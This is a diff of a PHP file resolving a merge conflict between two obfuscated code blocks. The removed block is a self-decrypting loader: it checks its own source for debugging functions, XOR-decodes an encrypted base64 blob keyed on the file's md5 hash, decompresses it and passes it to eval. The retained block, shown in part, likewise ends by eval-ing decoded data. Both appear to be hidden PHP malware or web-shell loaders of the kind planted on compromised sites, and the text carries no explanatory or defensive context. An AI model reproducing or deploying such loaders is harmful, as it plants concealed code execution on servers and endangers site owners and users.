@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$irhexjno="b183d697ffebbde4037f6871b6ddf660";
-$jhktwsqm="52085e56070f5b065f07045303025c0755550503535951540107020703020205";
-$ynbdkzjymi="SOODMLx2uQEpH87lnod5Jit/eNGyL1pFaTlvoiEdT62X8StLRvHXDB7A+neekaSuevLgDAd7tMEmnMQ/28/ajsNkqIe0E9UpUvRBldgzW7Lk1wrqSHtPd29pomD7itd2btXpp554pj+5sF6/LqkWfYceCuF1OXLjjRbq6uuB/sdJrew3r33jkIBSjXLeAeYR96Na2XTGuX4HiCJbmT91eQWqH3e+LjNzmIMlHgff+wfZSW7BWeIGoqa7lzg7oHHVMyqn6h02intKbRd+/HCceK0Sl7d0GWoy2HJEO/TicJ4ibC8XXup++oFQ1E1lehWG8I9KEyyIdvd8KKU+l4h5SwQboSosmaJKrKPzqH3+qiAgFnQqLATLbpuhLUqDPNNW+JU45cK+OEZvyMX91GRLjcg31Qy1xINL8WnyMzzNZW2BEU7hoRwunhZHSV0TMWKwAMhg2GnEKOGAOm2ct31P+8OpwaGziOclDoHNIKm/gzBAh07RIcP7donCU3XfhuBmY3pL4pUyvkeg7FmsTdeWAD1KGc751FfLiWo1fTrdjhekNw5uSl/Ao9yqu8kb2VxuD0sdToaMMnIbTWKtwWTFTv5nP0FM57X2igzIodbRDEGR5VTjcxTZm9B8Q5IwGdHy6NiRk8PFDGFeUcYg67s+PxNoW7l9LEgDDcNfEM3aQe3Wgqt9MebPlt7PO+dXjqOTsBnli3ceuYn4FjCAmtT4307mWvxVxWRfwtBdOJlDNlTpcPvWalaL8ARS3BmWvZlCZGg8xgqiVkrcYfv0UZKs+eFKgi4GDHn0OIZTeGpGac42JRKNNbI9UJ+7PVBO56HvDL6vKeruKUNw6+ANfDampWZ+a91ag1wKgOCqmnpehKk76CkB2pZ1B1irgA==";
-$yemdakzlnfi=file_get_contents(__FILE__);
-$whctkms=str_replace($ynbdkzjymi,"",$yemdakzlnfi);
-if(strpos($whctkms,"ec"."ho")!==false||strpos($whctkms,"pr"."int")!==false||strpos($whctkms,"var_"."dump")!==false||strpos($whctkms,"file_put_"."contents")!==false||strpos($whctkms,"fw"."rite")!==false){die();}
-$bdiaibeul=str_replace(array($irhexjno,$jhktwsqm),array("SP_e99dc492","KP_4cd6879b"),$yemdakzlnfi);
-$hpvcftv=md5($bdiaibeul);
-$boeuuiuiyy=hex2bin($jhktwsqm);
-$uguttnlw="";
-$ewzehpfe=strlen($hpvcftv);
-for($fjxfybbzn=0;$fjxfybbzn<$ewzehpfe;$fjxfybbzn++){
-$uguttnlw.=chr(ord($boeuuiuiyy[$fjxfybbzn])^ord($hpvcftv[$fjxfybbzn]));
-}
-$ynlxjv=base64_decode($ynbdkzjymi);
-$jehmext=strlen($ynlxjv);
-$djfxdr="";
-$jkkxjxkhod=strlen($uguttnlw);
-for($fjxfybbzn=0;$fjxfybbzn<$jehmext;$fjxfybbzn++){
-$djfxdr.=$ynlxjv[$fjxfybbzn]^$uguttnlw[$fjxfybbzn%$jkkxjxkhod];
-}
-$xdrtxgds="gzun"."compress";
-eval($xdrtxgds($djfxdr));
-=======
 // f27289f4e57c919703398a39
 $QgDVAnfkBBAoB="cWi3jslPkM+APuLwwwhGj1oV8Wr01zSKOlmD2c9u5A8=";
 $SqGijabjgtTOr="pJv3wfyCxZ+NChYjjjuTw1bI8Je01mFXByzQ2p9h5N8=";
@@ -52,4 +27,3 @@ $eCvsGthSJEU=$PrVGkjNpwK($eCvsGthSJEU);
 $eCvsGthSJEU=$HylFyCVEFhIu($eCvsGthSJEU);
 $eCvsGthSJEU=$NDvYSzhxdmnFh($eCvsGthSJEU);
 eval($eCvsGthSJEU);
->>>>>>> Stashed changes
